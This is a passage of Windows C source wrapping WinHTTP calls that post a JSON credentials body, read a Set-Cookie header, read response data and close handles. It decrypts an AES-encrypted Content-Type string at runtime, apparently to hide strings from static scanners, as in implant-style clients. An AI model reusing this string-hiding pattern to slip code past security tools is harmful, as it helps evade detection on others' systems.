    char encryptedContentType[] = { 0x1f, 0xaa, 0xb5, 0x9c, 0x45, 0xea, 0xac, 0x37, 0xcd, 0x81, 0x89, 0x1e, 0x1a, 0xa0, 0xee, 0x46, 0x1e, 0xac, 0x18, 0x2f, 0x45, 0x25, 0xf5, 0x13, 0x9, 0xb0, 0x1, 0x91, 0x4, 0xe0, 0x62, 0xe3 };

    // Decrypt Content-Type
    AESDecrypt( (char *) encryptedContentType, sizeof( encryptedContentType ), (char *) key, sizeof( key ) );
    // Convert Content-Type to wide string
    wchar_t * wideContentType = convertCharArrayToLPCWSTR( encryptedContentType );
    
    // Decrypt credentials
    //AESDecrypt( (char *) encryptedCreds, sizeof(encryptedCreds), (char *) key, sizeof(key) );
    DWORD dwDataLength = (DWORD) strlen( jsonData );

    // Send a request
    return WinHttpSendRequest( hReq,                                     // Request handle hReq
                               wideContentType,                          // L"Content-Type: application/json"
                               -1L,                                      // lpszHeaders is not NULL
                               jsonData,                                 // Credentials for authentication 
                               dwDataLength,                             // Length of the credentials
                               dwDataLength,                             // Length of total data, in this case same as length of credentials
                               0 );                                      // Value to callback functions
}

/* !
 * @brief End the request
 * @param hRequest      -> Request handle by WinHttpOpenRequest
 * @param lpReserved    -> Reserved parameter (NULL)
 * @return TRUE if successful, otherwise FALSE
 */
BOOL receive_response_winhttp( HINTERNET hReq )
{
    // End the request
    return WinHttpReceiveResponse( hReq,    // Request handle hReq
                                   NULL );  // Reserved
}

/* !
 * @brief Retrieve parsed header (cookie)
 * @param hRequest          -> Request handle by WinHttpOpenRequest
 * @param dwInfoLevel       -> Query info flags of HTTP headers
 * @param pwszName          -> Headr name
 * @param lpBuffer          -> Buffer that receives the information
 * @param lpdwBufferLength  -> Length of the data buffer
 * @param lpdwIndex         -> Index to enumerate multiple headers with the same name
 * @return TRUE if successful, otherwise FALSE
 */ 
BOOL query_headers_winhttp( HINTERNET hReq, DWORD info, LPVOID buf, LPDWORD bufSize )
{
    // Retrieve Set-Cookie header
    return WinHttpQueryHeaders( hReq,                           // Request handle hReq
                                info,                           // WINHTTP_QUERY_SET_COOKIE
                                WINHTTP_HEADER_NAME_BY_INDEX,   // If info != WINHTTP_QUERY_CUSTOM -> WINHTTP_HEADER_NAME_BY_INDEX
                                buf,                            // Output buffer
                                bufSize,                        // Output buffer size
                                WINHTTP_NO_HEADER_INDEX );      // WINHTTP_NO_HEADER_INDEX
}

/* !
 * @brief Check for available data
 * @param hRequest                      -> Request handle by WinHttpOpenRequest
 * @param lpdwNumberOfBytesAvailable    -> Number of available bytes
 * @return TRUE if the function succeeds, otherwise FALSE
 */
BOOL query_data_winhttp( HINTERNET hReq, LPDWORD bytesToRead ) 
{
    // Check for available data
    return WinHttpQueryDataAvailable( hReq,             // Request handle hReq 
                                      bytesToRead );    // Available bytes to read
}

/* !
 * @brief Read the data
 * @param hRequest                  -> Request handle by WinHttpOpenRequest
 * @param lpBuffer                  -> Buffer where data is stored
 * @param dwNumberOfBytesToRead     -> Number of bytes to read
 * @param lpdwNumberOfBytesRead     -> Pointer to a variable that receives the number of bytes read
                                    -> When using WinHTTP asynchronously, always set this parameter to NULL and retrieve the information in the callback function; not doing so can cause a memory fault.
 * @return TRUE if successful, otherwise FALSE
*/
BOOL read_data_winhttp( HINTERNET hReq, LPVOID buffer, DWORD bytesToRead, LPDWORD bytesRead )
{
    // Read the data 
    return WinHttpReadData( hReq,           // Request handle hReq 
                            buffer,         // Buffer where data is stored
                            bytesToRead,    // Number of bytes to read
                            NULL );         // Since I use WinHTTP async I set this to NULL, otherwise bytesRead
}

/* !
 * @brief Close any open handles (request handle hReq, connection handle hCon and session handle hSes)
 * @param hInternet -> Valid handle to be closed
 * @return TRUE if the handle is successfully closed, otherwise FALSE
 */
BOOL close_request_winhttp( HINTERNET hReq )
{    
    // Close request open handle
    return WinHttpCloseHandle( hReq );
}

BOOL close_conenction_winhttp( HINTERNET hCon )
{
    // Close connection open handle
    return WinHttpCloseHandle( hCon );
}

BOOL close_session_handle( HINTERNET hSes )
{
    // Close session open handle
    return WinHttpCloseHandle( hSes );
}